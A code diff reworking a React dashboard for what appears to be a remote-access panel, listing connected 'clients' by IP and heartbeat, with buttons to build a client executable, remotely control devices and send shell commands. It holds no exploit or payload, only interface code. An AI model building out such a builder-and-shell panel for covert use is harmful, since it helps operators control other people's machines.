@@ -1,9 +1,16 @@
 'use client'
 
-import React, { useState, useEffect } from 'react';
-import { useAuth } from "@/lib/hooks/useAuth";
-import BottomNav from "@/components/nav/BottomNav";
-import { Search, Smartphone, Plus, Monitor, ArrowRight, X, Laptop } from 'lucide-react';
+import { useState, useEffect, useMemo } from 'react';
+import { useNavigate } from 'react-router-dom';
+import { useAuth } from '@/lib/hooks/useAuth';
+import BottomNav from '@/components/nav/BottomNav';
+import StatCard from '@/components/dashboard/StatCard';
+import QuickAction from '@/components/dashboard/QuickAction';
+import ClientCard from '@/components/dashboard/ClientCard';
+import { Button } from '@/components/ui/button';
+import { Input } from '@/components/ui/input';
+import { timeAgo } from '@/lib/utils';
+import { Search, Monitor, Radio, Terminal, Package, Plus, Activity, Wifi, WifiOff } from 'lucide-react';
 import io from 'socket.io-client';
 import config from '@/config.json';
 
@@ -12,46 +19,66 @@ const API_BASE = `${API_URL}/v${config.API_VERSION}`;
 
 export default function Dashboard() {
   const { user } = useAuth();
+  const navigate = useNavigate();
   const [connections, setConnections] = useState([]);
-  const [activeTab, setActiveTab] = useState('device');
-  const [showBuilder, setShowBuilder] = useState(false);
-  const [deviceType, setDeviceType] = useState('smartphone');
+  const [query, setQuery] = useState('');
 
   useEffect(() => {
     if (!API_URL) return;
+
+    const fetchConnections = async () => {
+      try {
+        const res = await fetch(`${API_BASE}/connections/recent`, { credentials: 'include' });
+        if (!res.ok) throw new Error(res.status);
+        setConnections(await res.json());
+      } catch (e) {
+        console.error('Error fetching connections:', e);
+      }
+    };
 
     fetchConnections();
 
     const socket = io(API_URL.split('/api')[0], { withCredentials: true });
     socket.on('newConnection', (connection) => {
       if (!user || String(connection.ownerId) !== String(user.id)) return;
-      setConnections(prev => [connection, ...prev].slice(0, 10));
+      setConnections(prev => {
+        const next = [connection, ...prev.filter(c => c._id !== connection._id)];
+        return next.slice(0, 50);
+      });
     });
     socket.on('connectionUpdated', (updatedConnection) => {
       if (!user || String(updatedConnection.ownerId) !== String(user.id)) return;
-      setConnections(prev => prev.map(conn =>
-        conn._id === updatedConnection._id ? updatedConnection : conn
-      ));
+      setConnections(prev => prev.map(c => c._id === updatedConnection._id ? updatedConnection : c));
     });
 
     return () => socket.disconnect();
   }, [user]);
 
-  const fetchConnections = async () => {
-    try {
-      const response = await fetch(`${API_BASE}/connections/recent`, {
-        credentials: 'include'
-      });
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const data = await response.json();
-      setConnections(data);
-    } catch (error) {
-      console.error('Error fetching connections:', error);
-    }
-  };
+  const stats = useMemo(() => {
+    const online = connections.filter(c => c.isActive).length;
+    const lastActivity = connections
+      .map(c => c.lastHeartbeat || c.timestamp)
+      .filter(Boolean)
+      .sort((a, b) => new Date(b) - new Date(a))[0];
+    return {
+      total: connections.length,
+      online,
+      offline: connections.length - online,
+      lastActivity
+    };
+  }, [connections]);
+
+  const filtered = useMemo(() => {
+    const q = query.trim().toLowerCase();
+    if (!q) return connections;
+    return connections.filter(c =>
+      (c.deviceInfo || '').toLowerCase().includes(q) ||
+      (c.ip || '').toLowerCase().includes(q)
+    );
+  }, [connections, query]);
 
   return (
-    <div className="relative min-h-screen bg-gray-950 pb-16 sm:pb-20">
+    <div className="relative min-h-screen bg-gray-950 pb-20 sm:pb-24 text-white">
       <div className="absolute inset-0 overflow-hidden pointer-events-none">
         <div className="absolute -top-1/2 -left-1/2 w-full h-full rounded-full bg-purple-600/[0.07] blur-[120px]" />
         <div className="absolute -bottom-1/2 -right-1/2 w-full h-full rounded-full bg-purple-500/[0.05] blur-[120px]" />
@@ -61,169 +88,77 @@ export default function Dashboard() {
         backgroundSize: '32px 32px'
       }} />
 
-      <header className="relative z-10 p-3 sm:p-4 border-b border-white/[0.06]">
-        <div className="max-w-3xl mx-auto">
-          <div className="flex items-center gap-3 mb-3">
-            <div className="w-9 h-9 bg-purple-500/20 rounded-xl flex items-center justify-center shrink-0">
-              <Smartphone className="w-4 h-4 text-purple-400" />
-            </div>
-            <div className="min-w-0">
-              <h1 className="font-semibold text-sm sm:text-base text-white truncate">{user?.username}</h1>
-              <div className="flex items-center gap-2">
-                <span className="text-xs sm:text-sm text-gray-500">Managed Devices: 1</span>
-                <span className="px-1.5 sm:px-2 py-0.5 text-[10px] sm:text-xs bg-purple-500/20 text-purple-300 rounded font-medium">Free</span>
-              </div>
-            </div>
+      <header className="relative z-10 p-4 sm:p-6 border-b border-white/[0.06]">
+        <div className="max-w-5xl mx-auto flex items-center gap-3">
+          <div className="w-10 h-10 bg-purple-500/20 rounded-xl flex items-center justify-center shrink-0">
+            <Monitor className="w-5 h-5 text-purple-400" />
           </div>
-
-          <div className="flex gap-4 sm:gap-6 border-b border-white/[0.06]">
-            <button
-              className={`pb-2.5 text-sm sm:text-base transition-colors ${activeTab === 'device' ? 'text-purple-400 border-b-2 border-purple-400' : 'text-gray-500 hover:text-gray-300'}`}
-              onClick={() => setActiveTab('device')}
-            >
-              My Device
-            </button>
-            <button
-              className={`pb-2.5 text-sm sm:text-base transition-colors ${activeTab === 'connections' ? 'text-purple-400 border-b-2 border-purple-400' : 'text-gray-500 hover:text-gray-300'}`}
-              onClick={() => setActiveTab('connections')}
-            >
-              Connections
-            </button>
+          <div className="min-w-0">
+            <h1 className="font-semibold text-base sm:text-lg text-white truncate">{user?.username || 'Dashboard'}</h1>
+            <div className="flex items-center gap-2">
+              <span className="text-xs text-gray-500">Welcome back</span>
+              <span className="px-1.5 py-0.5 text-[10px] bg-purple-500/20 text-purple-300 rounded font-medium">Free</span>
+            </div>
           </div>
         </div>
       </header>
 
-      <div className="relative z-10 max-w-3xl mx-auto">
-        <div className="p-3 sm:p-4">
-          <div className="relative">
-            <Search className="absolute left-3 top-2.5 h-4 w-4 sm:h-5 sm:w-5 text-gray-500" />
-            <input
-              type="text"
-              placeholder="Search"
-              className="w-full pl-9 sm:pl-10 pr-4 py-2.5 text-sm sm:text-base bg-gray-800/50 border border-white/[0.08] rounded-xl text-white placeholder:text-gray-600 outline-none focus:border-purple-500/50 focus:shadow-[0_0_0_3px_rgba(139,92,246,0.1)] transition-all"
+      <div className="relative z-10 max-w-5xl mx-auto p-4 sm:p-6 space-y-6">
+        <section className="grid grid-cols-2 sm:grid-cols-4 gap-3 sm:gap-4">
+          <StatCard label="Total" value={stats.total} icon={Monitor} accent="text-purple-400" />
+          <StatCard label="Online" value={stats.online} icon={Wifi} accent="text-green-400" pulse={stats.online > 0} />
+          <StatCard label="Offline" value={stats.offline} icon={WifiOff} accent="text-gray-400" />
+          <StatCard label="Last activity" value={timeAgo(stats.lastActivity)} icon={Activity} accent="text-violet-300" isText />
+        </section>
+
+        <section className="grid grid-cols-1 sm:grid-cols-3 gap-3">
+          <QuickAction icon={Package} label="Build client" desc="Create a new exe" onClick={() => navigate('/dash/builder')} />
+          <QuickAction icon={Radio} label="Remote" desc="Control a device" onClick={() => navigate('/dash/remote')} />
+          <QuickAction icon={Terminal} label="Shell" desc="Send commands" onClick={() => navigate('/dash/shell')} />
+        </section>
+
+        <section>
+          <div className="flex items-center justify-between mb-3">
+            <h2 className="text-sm font-medium text-gray-300">Your clients</h2>
+            <span className="text-xs text-gray-500">{filtered.length} {filtered.length === 1 ? 'device' : 'devices'}</span>
+          </div>
+
+          <div className="relative mb-3">
+            <Search className="absolute left-3 top-3 h-4 w-4 text-gray-500 pointer-events-none" />
+            <Input
+              value={query}
+              onChange={(e) => setQuery(e.target.value)}
+              placeholder="Search by name or IP"
+              className="pl-10 bg-gray-800/50 border-white/[0.08] text-white placeholder:text-gray-600 focus-visible:ring-purple-500/30"
             />
           </div>
-        </div>
 
-        {activeTab === 'device' ? (
-          <div className="px-3 sm:px-4 space-y-3 sm:space-y-4">
-            <div className="p-3 sm:p-4 bg-gray-900/50 backdrop-blur-sm border border-white/[0.06] rounded-xl flex items-center">
-              <div className="w-8 h-12 sm:w-10 sm:h-16 bg-gray-800/50 rounded-lg flex items-center justify-center shrink-0">
-                <Smartphone className="w-5 h-5 sm:w-6 sm:h-6 text-gray-400" />
+          {connections.length === 0 ? (
+            <div className="flex flex-col items-center justify-center text-center p-10 bg-gray-900/40 backdrop-blur-sm border border-white/[0.06] rounded-2xl">
+              <div className="w-16 h-16 rounded-2xl bg-purple-500/10 flex items-center justify-center mb-3">
+                <Monitor className="w-8 h-8 text-purple-400/70" />
               </div>
-              <div className="flex-1 ml-3 sm:ml-4 min-w-0">
-                <h3 className="font-medium text-sm sm:text-base text-white truncate">iPhone (This device)</h3>
-              </div>
-              <ArrowRight className="w-4 h-4 sm:w-5 sm:h-5 text-purple-400 shrink-0" />
-            </div>
-
-            <button
-              className="w-full p-3 sm:p-4 bg-gray-900/50 backdrop-blur-sm border border-white/[0.06] rounded-xl flex items-center hover:border-purple-500/30 transition-colors"
-              onClick={() => setShowBuilder(true)}
-            >
-              <div className="w-8 h-12 sm:w-10 sm:h-16 bg-gray-800/50 rounded-lg flex items-center justify-center shrink-0">
-                <Plus className="w-5 h-5 sm:w-6 sm:h-6 text-gray-400" />
-              </div>
-              <div className="flex-1 ml-3 sm:ml-4 min-w-0">
-                <h3 className="font-medium text-sm sm:text-base text-white text-left">Add Device</h3>
-              </div>
-              <Plus className="w-4 h-4 sm:w-5 sm:h-5 text-purple-400 shrink-0" />
-            </button>
-          </div>
-        ) : (
-          <div className="px-3 sm:px-4 space-y-3 sm:space-y-4">
-            {connections.length === 0 && (
-              <p className="text-center text-sm text-gray-500 py-8">No connections yet.</p>
-            )}
-            {connections.map((connection) => (
-              <div key={connection._id} className="p-3 sm:p-4 bg-gray-900/50 backdrop-blur-sm border border-white/[0.06] rounded-xl flex items-center">
-                <div className="w-8 h-12 sm:w-10 sm:h-16 bg-gray-800/50 rounded-lg flex items-center justify-center shrink-0">
-                  <Monitor className="w-5 h-5 sm:w-6 sm:h-6 text-gray-400" />
-                </div>
-                <div className="flex-1 ml-3 sm:ml-4 min-w-0">
-                  <h3 className="font-medium text-sm sm:text-base text-white truncate">{connection.deviceInfo}</h3>
-                  <p className="text-xs sm:text-sm text-gray-500 truncate">{connection.ip}</p>
-                  <div className="flex items-center gap-1.5 mt-1">
-                    <div className={`w-1.5 h-1.5 sm:w-2 sm:h-2 rounded-full ${connection.isActive ? 'bg-green-500' : 'bg-red-500'}`} />
-                    <span className="text-[10px] sm:text-xs text-gray-500">
-                      {connection.isActive ? 'Online' : 'Offline'}
-                    </span>
-                  </div>
-                </div>
-              </div>
-            ))}
-          </div>
-        )}
-
-        <div className="flex flex-col items-center justify-center p-6 sm:p-8 mt-4 sm:mt-8">
-          <div className="w-24 h-24 sm:w-32 sm:h-32 bg-purple-500/10 rounded-2xl flex items-center justify-center mb-3 sm:mb-4">
-            <Monitor className="w-12 h-12 sm:w-16 sm:h-16 text-purple-400/60" />
-          </div>
-          <p className="text-center text-xs sm:text-sm text-gray-500">Easy connect to device</p>
-        </div>
-      </div>
-
-      {showBuilder && (
-        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-end sm:items-center justify-center z-50 p-0 sm:p-4">
-          <div className="bg-gray-900 border border-white/[0.06] rounded-t-2xl sm:rounded-2xl w-full sm:max-w-md max-h-[85vh] sm:max-h-[90vh] overflow-auto">
-            <div className="p-4 border-b border-white/[0.06] flex justify-between items-center sticky top-0 bg-gray-900">
-              <h2 className="font-semibold text-base sm:text-lg text-white">Add New Device</h2>
-              <button
-                onClick={() => setShowBuilder(false)}
-                className="p-1 rounded-full hover:bg-white/[0.06] transition-colors"
+              <p className="text-sm text-gray-400 mb-1">No client yet</p>
+              <p className="text-xs text-gray-600 mb-4">Build an executable and run it to see it appear here.</p>
+              <Button
+                onClick={() => navigate('/dash/builder')}
+                className="bg-gradient-to-r from-purple-600 to-violet-600 text-white hover:brightness-110 shadow-lg shadow-purple-500/20"
               >
-                <X className="w-5 h-5 text-gray-400" />
-              </button>
+                <Plus className="w-4 h-4 mr-2" />
+                Build your first client
+              </Button>
             </div>
-
-            <div className="p-4 space-y-4">
-              <div className="grid grid-cols-2 gap-3 sm:gap-4">
-                <button
-                  className={`p-3 sm:p-4 rounded-xl border flex flex-col items-center transition-all ${deviceType === 'smartphone' ? 'border-purple-500/50 bg-purple-500/10' : 'border-white/[0.08] bg-gray-800/50 hover:border-white/[0.12]'}`}
-                  onClick={() => setDeviceType('smartphone')}
-                >
-                  <Smartphone className={`w-6 h-6 sm:w-8 sm:h-8 mb-2 ${deviceType === 'smartphone' ? 'text-purple-400' : 'text-gray-400'}`} />
-                  <span className={`text-sm sm:text-base ${deviceType === 'smartphone' ? 'text-purple-300' : 'text-gray-300'}`}>Smartphone</span>
-                </button>
-                <button
-                  className={`p-3 sm:p-4 rounded-xl border flex flex-col items-center transition-all ${deviceType === 'laptop' ? 'border-purple-500/50 bg-purple-500/10' : 'border-white/[0.08] bg-gray-800/50 hover:border-white/[0.12]'}`}
-                  onClick={() => setDeviceType('laptop')}
-                >
-                  <Laptop className={`w-6 h-6 sm:w-8 sm:h-8 mb-2 ${deviceType === 'laptop' ? 'text-purple-400' : 'text-gray-400'}`} />
-                  <span className={`text-sm sm:text-base ${deviceType === 'laptop' ? 'text-purple-300' : 'text-gray-300'}`}>Laptop</span>
-                </button>
-              </div>
-
-              <div className="space-y-3">
-                <div>
-                  <label className="block text-xs font-medium text-gray-400 mb-1.5 ml-0.5">Device Name</label>
-                  <input
-                    type="text"
-                    placeholder="Enter device name"
-                    className="w-full p-2.5 text-sm sm:text-base bg-gray-800/50 border border-white/[0.08] rounded-xl text-white placeholder:text-gray-600 outline-none focus:border-purple-500/50 focus:shadow-[0_0_0_3px_rgba(139,92,246,0.1)] transition-all"
-                  />
-                </div>
-                <div>
-                  <label className="block text-xs font-medium text-gray-400 mb-1.5 ml-0.5">IP Address</label>
-                  <input
-                    type="text"
-                    placeholder="192.168.1.1"
-                    className="w-full p-2.5 text-sm sm:text-base bg-gray-800/50 border border-white/[0.08] rounded-xl text-white placeholder:text-gray-600 outline-none focus:border-purple-500/50 focus:shadow-[0_0_0_3px_rgba(139,92,246,0.1)] transition-all"
-                  />
-                </div>
-              </div>
-
-              <div className="pt-2 pb-2">
-                <button className="w-full bg-gradient-to-r from-purple-600 to-violet-600 text-white py-3 rounded-xl font-semibold hover:brightness-110 transition text-sm sm:text-base shadow-lg shadow-purple-500/20">
-                  Add Device
-                </button>
-              </div>
+          ) : filtered.length === 0 ? (
+            <p className="text-center text-sm text-gray-500 py-8">No device matches "{query}".</p>
+          ) : (
+            <div className="space-y-2">
+              {filtered.map(c => <ClientCard key={c._id} connection={c} />)}
             </div>
-          </div>
-        </div>
-      )}
+          )}
+        </section>
+      </div>
 
       <BottomNav />
     </div>
-  )
+  );
 }
